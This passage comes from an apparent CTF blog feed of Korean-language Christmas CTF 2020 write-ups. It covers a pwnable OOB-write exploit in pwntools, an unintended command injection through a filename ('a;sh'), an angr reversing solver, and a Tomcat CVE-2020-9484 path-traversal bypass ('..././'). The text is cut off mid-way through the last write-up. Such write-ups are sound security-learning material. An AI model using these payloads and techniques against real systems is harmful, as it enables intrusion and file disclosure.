ìˆìŠµë‹ˆë‹¤. subleq ì½”ë“œë¥¼ ë‹´ê³  ìˆëŠ” íŒŒì¼ì„ cache í•˜ëŠ” ë£¨í‹´ë„ ì¡´ì¬í•˜ëŠ”ë° íŒŒì¼ì˜ ê²½ë¡œë§Œ ë°”ë€” ë¿ íŒŒì¼ëª…ì„ ìœ ì§€í•©ë‹ˆë‹¤. Write Code ê¸°ëŠ¥ìœ¼ë¡œ flagë¼ëŠ” íŒŒì¼ì„ ìƒì„±í•˜ê³  ì‹¤ì œ flagíŒŒì¼ì´ cache ë˜ë„ë¡ ë¦¬í„´ ê°’ì„ ìœ ë„í•˜ë©´ ë©ë‹ˆë‹¤.</p><h1 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png"></p><p>ìœ„ ì‚¬ì§„ì€ í•¨ìˆ˜ subleq()ì˜ ì½”ë“œì…ë‹ˆë‹¤. a2ì˜ indexë¡œ ì‚¬ìš©ë˜ëŠ” v4ì™€ v5ì˜ ìµœëŒ“ê°’ì´ ì¡´ì¬í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì— oob writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. v4ì™€ v5ê°’ë¥¼ ì´ìš©í•´ a2ë³´ë‹¤ ë†’ì€ ì£¼ì†Œì— ìˆëŠ” ìŠ¤íƒ ì–´ë””ë“  ì°¸ì¡°í•  ìˆ˜ ìˆê²Œ ë˜ê³  ë¦¬í„´ ê°’ì„ ì˜¤ì—¼ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Enter your Program\&#x27;s Name : &#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Enter Code : &#x27;</span>,<span class="hljs-string">&#x27;4 166 -1 -1 -1054&#x27;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125; ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png"></p><p>íŒŒì¼ëª… í•„í„° í•¨ìˆ˜ì…ë‹ˆë‹¤. íŒŒì¼ëª…ì— ì˜ë¬¸ ì†Œë¬¸ì ì´ì™¸ì˜ ì…ë ¥ì´ ë“¤ì–´ì˜¨ë‹¤ë©´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•©ë‹ˆë‹¤. ì•ˆíƒ€ê¹ê²Œë„ ìœ ì‹¬íˆ ë³´ì‹œë©´ ì²« ê¸€ìë§Œ ê²€ì‚¬í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. <s>ë¬¸ì œ ë§Œë“  ë†ˆì´ í”µì‹ ì¸ë“¯</s></p><pre><code class="hljs plain"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&#39;s Name : a;sh Enter Code : your an idiot &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125;$</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>oob</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - angrforge</title>
    <link href="/2020/12/29/idioth/christmasctf2020-angrforge/"/>
    <url>/2020/12/29/idioth/christmasctf2020-angrforge/</url>
    
    <content type="html"><![CDATA[<h1 id="ì¶œì œ-ì˜ë„"><a href="#ì¶œì œ-ì˜ë„" class="headerlink" title="ì¶œì œ ì˜ë„"></a>ì¶œì œ ì˜ë„</h1><p>angrë¥¼ í†µí•´ ì…ë ¥ ê°’ì„ ë½‘ì•„ë‚´ëŠ” ê²ƒì´ ì˜ë„ì¸ ë¬¸ì œì˜€ìŠµë‹ˆë‹¤. ì´ ë¬¸ì œëŠ” ì—¬ëŸ¬ ë²ˆì˜ ìˆ˜ì •ì„ ê±°ì³¤ìŠµë‹ˆë‹¤. ì›ë˜ ì´ ë¬¸ì œë„ arm í™˜ê²½ì—ì„œ angrë¥¼ ëŒë¦¬ëŠ” ë¬¸ì œë¡œ ë‚¼ ì˜ˆì •ì´ì—ˆëŠ”ë° armì—ì„œ ì œëŒ€ë¡œ ë™ì‘í•˜ì§€ ì•Šì•„ì„œ armì€ í¬ê¸°. ê·¸ë¦¬ê³  ì›ë˜ ì²˜ìŒì—ëŠ” c++ë¡œ ëƒˆì—ˆëŠ”ë° ê²€ìˆ˜ í›„ ìˆ˜ì •ì„ í–ˆë”ë‹ˆ simulation managerë¥¼ ëŒë ¤ë„ ê°’ì´ ì œëŒ€ë¡œ ë‚˜ì˜¤ì§€ ì•Šì•„ì„œ cë¡œ ì˜®ê¸°ëŠ” ê³¼ì •ì—ì„œ ì—°ì‚° ëª‡ ê°œë¥¼ ëºìŠµë‹ˆë‹¤..ã… </p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ file angrforge<span class="hljs-attribute">angrforge</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked,<span class="hljs-attribute">interpreter</span> /lib<span class="hljs-number">64</span>/ld-linux-x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>,<span class="hljs-attribute">BuildID</span>[sha<span class="hljs-number">1</span>]=<span class="hljs-number">1162</span>ed<span class="hljs-number">229</span>a<span class="hljs-number">12133</span>d<span class="hljs-number">07</span>de<span class="hljs-number">26301</span>dad<span class="hljs-number">1</span>ada<span class="hljs-number">34</span>a<span class="hljs-number">9</span>c<span class="hljs-number">3</span>ff, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, stripped</code></pre><p>64bit ELF íŒŒì¼ì´ë©°, stripped ë˜ì–´ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00103be1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  undefined8 local_58;  undefined8 local_50;  undefined8 local_48;  undefined8 local_40;  undefined8 local_38;  undefined8 local_30;  undefined8 local_28;  undefined local_20;  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  local_58 = <span class="hljs-number">0</span>;  local_50 = <span class="hljs-number">0</span>;  local_48 = <span class="hljs-number">0</span>;  local_40 = <span class="hljs-number">0</span>;  local_38 = <span class="hljs-number">0</span>;  local_30 = <span class="hljs-number">0</span>;  local_28 = <span class="hljs-number">0</span>;  local_20 = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;General Angerforge, the Dark Iron responsible for stealing my computer.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But I\&#x27;m just a programmer.. so Call me my best warrior friend.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you call my friend, I will give you a good reward.&quot;</span>);  fgets((<span class="hljs-keyword">char</span> *)&amp;local_58,<span class="hljs-number">0x39</span>,<span class="hljs-built_in">stdin</span>);  FUN_00103a48(&amp;local_58);  iVar1 = FUN_001039f7(&amp;local_58);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG, Thank you for your good works :)&quot;</span>);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001039d9();  &#125;  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>    __stack_chk_fail();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ghidraë¥¼ í†µí•´ ë””ì»´íŒŒì¼ì„ í•œ í›„ mainì„ í™•ì¸í•´ë³´ë©´, <code>0x39(57)</code>ë§Œí¼ì˜ ì…ë ¥ ê°’ì„ ë°›ì•„ì„œ <code>FUN_00103a48</code>ì„ í˜¸ì¶œí•˜ê³ , <code>FUN_001039f7</code>ì„ í†µí•´ ë¬¸ìì—´ì„ ì²´í¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00103a48</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  <span class="hljs-keyword">if</span> (sVar1 &lt; (ulong)(<span class="hljs-keyword">long</span>)(<span class="hljs-keyword">int</span>)((DAT_00106014 | DAT_00106010) + <span class="hljs-number">5</span>)) &#123;    FUN_001033e9(param_1);    FUN_00103481(param_1);    FUN_00103519(param_1);    FUN_001035b1(param_1);    FUN_00103649(param_1);    FUN_001036e1(param_1);    FUN_00103779(param_1);    FUN_00103811(param_1);    FUN_001038a9(param_1);    FUN_00103941(param_1);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001011c9(param_1);    FUN_00101396(param_1);    FUN_00101563(param_1);    FUN_00101730(param_1);    FUN_001018fd(param_1);    FUN_00101abf(param_1);    FUN_00101bbf(param_1);    FUN_00101cce(param_1);    FUN_00101dce(param_1);    FUN_00101eee(param_1);    FUN_001022cb(param_1);    FUN_00102589(param_1);    FUN_00102847(param_1);    FUN_00102b05(param_1);    FUN_00102dc3(param_1);    FUN_00102ef9(param_1);    FUN_00103035(param_1);    FUN_00103171(param_1);    FUN_001032ad(param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>FUN_00103a48</code> í•¨ìˆ˜ëŠ” ì…ë ¥ ê°’ì„ ë°›ì•„ì„œ, ê¸¸ì´ì— ë”°ë¼ì„œ ì—¬ëŸ¬ ê°€ì§€ ë‹¤ë¥¸ sub í•¨ìˆ˜ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤. ê° sub í•¨ìˆ˜ì˜ ì—°ì‚°ì€ ì„œë¡œ ë‹¤ë¥¸ ë°”ì´íŠ¸ì— ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•Šê³  í•¨ìˆ˜ê°€ ë‹¤ë¥¸ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë¡œì§ë„ ìˆì–´ì„œ ìƒë‹¹íˆ ë³µì¡í•˜ê²Œ ì–½í˜€ìˆìŠµë‹ˆë‹¤. c++ì—ëŠ” ê³± ì—°ì‚° ê°™ì€ ê²ƒë„ ë„£ì—ˆëŠ”ë° cë¡œ ê¸‰í•˜ê²Œ ì˜®ê¸°ë©´ì„œ ë³´ë‹ˆ ë°”ì´íŠ¸ê°€ ì¦ë°œí•˜ë”êµ°ìš”..ã…  <del>ì‹œê°„ ë¶€ì¡±ìœ¼ë¡œ ì¸í•œ ì—­ ì—°ì‚° ê°€ëŠ¥ ë¡œì§</del></p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_001039f7</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> local_c;    local_c = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x37</span> &lt; local_c) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">char</span> *)(param_1 + local_c) != (&amp;DAT_00104080)[local_c]) <span class="hljs-keyword">break</span>;    local_c = local_c + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>FUN_001039f7</code>ì—ì„œëŠ” 0x38ë§Œí¼ <code>DAT_00104080</code>ê³¼ ê°’ì„ ë¹„êµí•˜ì—¬ ë§ìœ¼ë©´ <code>1</code>, ì•„ë‹ ì‹œ <code>0</code>ì„ ë¦¬í„´í•´ì¤ë‹ˆë‹¤.</p><p><code>\n</code>ì„ ì œì™¸í•œ ë¬¸ìì—´ì˜ ê¸¸ì´ëŠ” 56ì´ê³ , <code>stdin</code>ì„ í†µí•´ ì…ë ¥ ê°’ì´ ë“¤ì–´ê°€ë¯€ë¡œ ì…ë ¥ ê°’ 56ê³¼ <code>stdin</code>ì„ ì²˜ë¦¬í•˜ëŠ” stateë¥¼ êµ¬ì„±í•˜ì—¬ simulation managerë¥¼ ëŒë¦¬ë©´ ê°’ì„ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripyp = angr.Project(<span class="hljs-string">&#x27;./angrforge&#x27;</span>)flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">56</span>)]flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])st = p.factory.full_init_state(    stdin = flag,    add_options = angr.options.unicorn,)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_chars:    st.solver.add(i != <span class="hljs-number">0</span>)    st.solver.add(i != <span class="hljs-number">10</span>)sm = p.factory.simulation_manager(st)sm.run()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sm.deadended:    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;OMG&#x27;</span> <span class="hljs-keyword">in</span> i.posix.dumps(<span class="hljs-number">1</span>):        print(i.posix.dumps(<span class="hljs-number">0</span>))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ python<span class="hljs-number">3</span> solve.py<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">44</span>,<span class="hljs-number">086</span> | cle.loader | The main binary is a position-independent executable.<span class="hljs-attribute">It</span> is being loaded with a base address of <span class="hljs-number">0</span>x<span class="hljs-number">400000</span>.<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">45</span>,<span class="hljs-number">089</span> | angr.simos.simos | stdin is constrained to <span class="hljs-number">57</span> bytes (has_end=True).<span class="hljs-attribute">If</span> you are only providing the first <span class="hljs-number">57</span> bytes instead of the entire stdin,<span class="hljs-attribute">please</span> use stdin=SimFileStream(name=&#x27;stdin&#x27;, content=your_first_n_bytes, has_end=False).<span class="hljs-attribute">b</span>&#x27;XMAS&#123;h<span class="hljs-number">3</span>_<span class="hljs-number">1</span>s_b<span class="hljs-number">1</span>o<span class="hljs-number">0</span>d<span class="hljs-number">3</span>lf_d<span class="hljs-number">3</span>athkni<span class="hljs-number">9</span>ht_wh<span class="hljs-number">0</span>_will_kill_<span class="hljs-number">4</span>ngrf<span class="hljs-number">0</span>rge&#125;\n&#x27;</code></pre><p>Flag : XMAS{h3_1s_b1o0d3lf_d3athkni9ht_wh0_will_kill_4ngrf0rge}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>christmas ctf 2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - gift</title>
    <link href="/2020/12/29/idioth/christmasctf2020-gift/"/>
    <url>/2020/12/29/idioth/christmasctf2020-gift/</url>
    
    <content type="html"><![CDATA[<h1 id="ì¶œì œ-ì˜ë„"><a href="#ì¶œì œ-ì˜ë„" class="headerlink" title="ì¶œì œ ì˜ë„"></a>ì¶œì œ ì˜ë„</h1><p>ì˜¬í•´ ì´ˆì— ë°œí‘œëœ Apache Tomcat CVE-2020-9484ë¥¼ ì´ìš©í•´ì„œ ë¬¸ì œë¥¼ ë§Œë“¤ì–´ë³´ê³  ì‹¶ì—ˆìŠµë‹ˆë‹¤. ë¬¸ì œë¥¼ ë§Œë“¤ë©´ì„œ ì´ ì·¨ì•½ì ì´ ìˆëŠ” ì„œë¹„ìŠ¤ë¥¼ ë§Œë“¤ê³  ì‹¶ì€ë°â€¦ ë§Œì•½ ì´ëŸ° ì‚¬ì´íŠ¸ê°€ ìˆì—ˆë‹¤ë©´ ì–´ë–¤ ì‹ìœ¼ë¡œ ì·¨ì•½ì ì— ì ‘ê·¼í•  ìˆ˜ ìˆì„ê¹Œ?ë¼ëŠ” ìƒê°ì„ í•˜ë©´ì„œ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤.</p><p>sessionì´ ì €ì¥ë˜ëŠ” ìœ„ì¹˜ì™€ ìì‹ ì´ ì˜¬ë¦° íŒŒì¼ì´ ì—…ë¡œë“œë˜ëŠ” ìœ„ì¹˜ë¥¼ ëª¨ë‘ ì•Œì•„ì•¼ í•˜ê³  ë˜ í•´ë‹¹ ì·¨ì•½ì ì— ì·¨ì•½í•œ ë²„ì „ì´ë¼ëŠ” ê²ƒë„ ì•Œì•„ì•¼ í•´ì„œ localì— ìˆëŠ” íŒŒì¼ì„ ëª¨ë‘ ë³¼ ìˆ˜ ìˆìœ¼ë©´ ë˜ê² ë‹¤ëŠ” ìƒê°ì„ í–ˆìŠµë‹ˆë‹¤. <del>lockê³¼ angrforgeì˜ í—ˆìˆ í•¨ì€ ì—¬ê¸°ì—ì„œ ì™”ë‹¤.</del></p><p>RCEë¥¼ í™œìš©í•´ì•¼ í•œë‹¤ëŠ” ê²ƒê³¼ ì‹¤í–‰í•  íŒŒì¼ì˜ ìœ„ì¹˜ë¥¼ <code>special.jsp</code>ì— ë„£ì–´ë†¨ëŠ”ë° ì¢€ ë” ì˜ ë³´ì´ëŠ” ê³³ì— ë„£ì–´ë‘˜ ê±¸â€¦ í•˜ëŠ” ìƒê°ì„ í–ˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg"></p><p>ì œê°€ ì›¹ ì•Œëª»ì´ë‹¤ ë³´ë‹ˆ ì´ëŸ°ì €ëŸ° ê²ƒì„ êµ¬í˜„í•  ë•Œ ì£¼ìœ„ì˜ ì›¹ í•˜ëŠ” ì¹œêµ¬ë“¤í•œí…Œ ë¬¼ì–´ë³´ë©° ì´ê±° ì´ëŸ¬ì´ëŸ¬í•˜ê²Œ í•´ì„œ í”Œë˜ê·¸ì— ì ‘ê·¼í•˜ëŠ” ê±´ë° ê²Œì‹±ì´ ì‹¬í•˜ì§€ ì•Šì„ê¹Œ? ì‚¬ëŒë“¤ì´ ì´ëŸ° ì‹ìœ¼ë¡œ ì ‘ê·¼í•  ìˆ˜ ìˆì„ê¹Œ? ë‚´ê°€ ì´ê±° ì–´ë–»ê²Œ í•˜ëŠ”ì§€ ì˜ ëª°ë¼ì„œ ì´ë ‡ê²Œ í•´ë´¤ëŠ”ë° ê´œì°®ì„ê¹Œ? ë¬¼ì–´ë³´ë©´ì„œ ë§Œë“¤ì—ˆìŠµë‹ˆë‹¤. <del>ì¼ë‹¨ ìˆëŠ” ê±° ë‹¤ í•´ë³´ê³  íŒŒì¼ì€ ë‹¤ ì°¾ì•„ë³¸ë‹¤ë©°</del></p><p>êµ¬í˜„ì„ ë„ì™€ì¤€ë‹¤ë˜ ë†ˆë“¤ì€ jspë¼ê³  í•˜ë‹ˆê¹Œ ë‹¤ ë„ë§ê°€ë”êµ°ìš” í•˜í•˜í•˜â€¦ ì¡ì„¤ì´ ê¸¸ì—ˆìŠµë‹ˆë‹¤.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png"></p><p>ë©”ì¸ í™”ë©´ì…ë‹ˆë‹¤. ì €ê¸° ê¹ƒë°œ(flag) ëª¨ì–‘ì— Special giftê°€ ìˆ¨ê²¨ì ¸ ìˆë‹¤!ë¼ê³  ë˜ì–´ìˆìŠµë‹ˆë‹¤. ì´ê±¸ descriptionì— ì ì–´ë†¨ìœ¼ë©´ ì°¸ ì¢‹ì•˜ì„ê±¸ ì™œ ì•ˆ ì ì–´ë†¨ì§€? ì¼ë‹¨ ë¡œê·¸ì¸ì„ í•´ì•¼ ê¸°ëŠ¥ì„ ë³¼ ìˆ˜ ìˆëŠ” ê²ƒ ê°™ìœ¼ë‹ˆ ë¡œê·¸ì¸ì„ í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png"></p><p>ë¡œê·¸ì¸ì„ í•˜ë©´ ì œê³µí•˜ëŠ” ê¸°ëŠ¥ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ì´íŠ¸ì—ì„œ ì œê³µí•˜ëŠ” ê¸°ëŠ¥ì„ ì •ë¦¬í•˜ë©´ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ul><li><code>Gift List</code><ul><li>ì „ì†¡í•œ ì„ ë¬¼ì˜ ë¦¬ìŠ¤íŠ¸ë¥¼ ë³¼ ìˆ˜ ìˆë‹¤.</li><li>file nameì„ <code>GET</code>ì„ í†µí•´ ë°›ëŠ”ë‹¤.</li></ul></li><li><code>Send List</code><ul><li>ì„ ë¬¼ì„ ì „ì†¡í•  ìˆ˜ ìˆë‹¤.</li></ul></li><li><code>Community</code><ul><li>ê²Œì‹œíŒ ê¸°ëŠ¥ìœ¼ë¡œ ê¸€ì„ ì‘ì„±í•  ìˆ˜ ìˆë‹¤.</li></ul></li></ul><p>ì„ ë¬¼ì„ ì „ì†¡í•˜ë©´ ì‚°íƒ€ê°€ ê·¸ ì„ ë¬¼ì„ ì¤€ë‹¤ê³  í•˜ê³  gift listì—ì„œ ì˜¬ë¦° ì„ ë¬¼ ë¦¬ìŠ¤íŠ¸ì˜ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë‹ˆ ì¼ë‹¨ <code>Send List</code>ë¥¼ í†µí•´ ì„ ë¬¼ì„ ì „ì†¡í•˜ê³  ë‚œ í›„ <code>Gift List</code>ì—ì„œ ì–´ë– í•œ ì‹ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìˆëŠ”ì§€ë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png"></p><p>txt íŒŒì¼ê³¼ ìì‹ ë“¤ì˜ secretí•œ íŒŒì¼ë§Œ ì˜¬ë¦´ ìˆ˜ ìˆë‹¤ê³  í•˜ë‹ˆ ì¼ë‹¨ txt íŒŒì¼ì„ ì˜¬ë ¤ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png"></p><p>ì „ì†¡ì´ ì™„ë£Œëœ í›„ <code>Gift List</code>ë¥¼ í†µí•´ íŒŒì¼ ë¦¬ìŠ¤íŠ¸ë¥¼ í™•ì¸í•˜ë©´ <code>&lt;name&gt;</code>â€˜s gift listë¼ëŠ” ì œëª©ê³¼ í•¨ê»˜ ì—…ë¡œë“œí•œ íŒŒì¼ì´ í‘œì‹œê°€ ë˜ê³  í•´ë‹¹ íŒŒì¼ì˜ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png"></p><p>gift listë¥¼ ë¶ˆëŸ¬ì˜¬ ë•Œ ì‚¬ìš©ë˜ëŠ” <code>&lt;name&gt;</code>ì€ <code>GET</code>ì„ í†µí•´ ë¶ˆëŸ¬ì˜¤ëŠ” ê²ƒìœ¼ë¡œ ì¶”ì •ë˜ë¯€ë¡œ í•´ë‹¹ ì¸ì ê°’ì„ ìˆ˜ì •í•´ë´…ë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png"></p><p>nameì„ ë³€ê²½í•˜ì testaâ€™s gift listë¥¼ ì½ì–´ì˜¤ê³  ì•„ë¬´ê²ƒë„ ì¶œë ¥ì´ ì•ˆ ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>nameì— ë”°ë¼ ë‹¤ë¥¸ ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•˜ê³  í•´ë‹¹ í´ë”ì— íŒŒì¼ì´ ì˜¬ë¼ê°„ë‹¤ëŠ” ê°€ì„¤ì„ ì„¸ìš°ê³  path traversalì´ ê°€ëŠ¥í•œì§€ í™•ì¸ì„ í•´ë´…ì‹œë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png"></p><p>nameì— <code>.</code>ì„ ì…ë ¥í•˜ì ì•„ê¹Œ ìœ„ì—ì„œ í™•ì¸í•œ ë‘ ê°œì˜ í´ë”ê°€ ë‚˜ì˜µë‹ˆë‹¤. ë” ìœ„ë¡œ ì˜¬ë¼ê°€ ë´…ì‹œë‹¤.</p><p><code>../</code>ë‚˜ <code>....//</code>ì€ í•„í„°ë§ì´ ë˜ì–´ ìˆì–´ ë””ë ‰í„°ë¦¬ ë¦¬ìŠ¤íŒ…ì´ ë¶ˆê°€ëŠ¥í•˜ì§€ë§Œ <code>..././</code>ì€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image8.png"></p><p>í•´ë‹¹ í´ë”ì— ì§„ì…í•˜ë©´ gift í´ë” ì•ˆì—ì„œ usernameìœ¼ë¡œ gift listê°€ ê´€ë¦¬ë˜ê³  ìˆìŒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image9.png"></p><p>í•œ ë²ˆ ë” ì˜¬ë¼ê°€ë©´ ì´ëŸ¬í•œ ë””ë ‰í„°ë¦¬ê°€ ë³´ì…ë‹ˆë‹¤. tomcatì˜ ìƒìœ„ ë””ë ‰í„°ë¦¬ì¸ë° ì´ë¥¼ í†µí•´ tomcatì„ í†µí•´ êµ¬ë™ë˜ê³  ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¨¼ì € ì›¹í˜ì´ì§€ ì†ŒìŠ¤ì½”ë“œ íŒŒì¼ì€ webappsì— ë“¤ì–´ìˆìœ¼ë¯€ë¡œ í•´ë‹¹ ë””ë ‰í„°ë¦¬ë¥¼ ë“¤ì–´ê°€ì„œ ì–´ë– í•œ íŒŒì¼ì´ ìˆëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img 